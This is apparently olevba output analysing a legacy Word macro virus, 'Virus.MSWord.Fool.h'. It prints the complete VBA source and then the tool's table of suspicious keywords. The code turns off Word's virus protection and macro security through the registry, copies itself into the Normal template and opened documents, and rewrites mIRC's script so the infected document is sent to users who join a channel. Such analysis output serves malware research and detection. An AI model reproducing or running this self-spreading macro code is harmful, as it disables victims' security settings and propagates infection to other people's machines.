olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.h
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fool.h - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Help.bas 
in file: Virus.MSWord.Fool.h - OLE stream: 'Macros/VBA/Help'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
    'Help Virus/Worm v1.00
    'The WaLRuS 05/00
    On Error Resume Next
    Options.ConfirmConversions = False
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The WaLRuS"
    Set Norm = NormalTemplate.VBProject.VBComponents: Set Doc = ActiveDocument.VBProject.VBComponents
If Norm.Item("Help").Name <> "Help" Then
    Doc("Help").Export "c:\Help.drv"
    Set infect = NormalTemplate.VBProject
ElseIf Doc.Item("Help").Name <> "Help" Then
    Norm("Help").Export "c:\Help.drv"
    Set infect = ActiveDocument.VBProject
End If
infect.VBComponents.Import ("c:\Help.drv")
Kill ("c:\Help.drv")
ActiveDocument.Save
CommandBars("Help").Controls("About Microsoft Word").Caption = "Its The WaLRuS"
If (Second(Now()) > 50) Then Call Mirc
If Day(Now) = 31 Then Call Help
End Sub

Sub Mirc()
    On Error Resume Next
    installed = Dir("c:\mirc\mirc32.exe")
    If installed = "" Then
    Exit Sub
    Else
    reproduce = Dir("c:\mirc\download\IRC-Rules.doc")
    If reproduce = "" Then ActiveDocument.SaveAs "c:\mirc\download\IRC-Rules.doc"
    Kill "c:\mirc\script.ini"
    Open "c:\mirc\script.ini" For Output As #1
    Print #1, "[script]"
    Print #1, "n0=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\IRC-Rules.doc }"
    Print #1, "n1=on 1:CONNECT: {"
    Print #1, "n2=  /join #virus "
    Print #1, "n3=  /msg #virus Help me if you can im feeling down. Im infected with the Help Virus by The WaLRuS"
    Print #1, "n4= /part #virus"
    Print #1, "n5= /clear"
    Print #1, "n6= /motd"
    Print #1, "n7= }"
    Close #1
    End If
End Sub

Sub HelpAbout()
    On Error Resume Next
    MsgBox "Help by The WaLRuS", 0, "Help I Need Somebody"
End Sub

Sub Help()
    On Error Resume Next
    Assistant.Visible = True
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "I do appreciate you being around"
    .Heading = "GREETINGS"
    .Show
    End With
End Sub

Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
Sub ViewVBCode()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc32.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

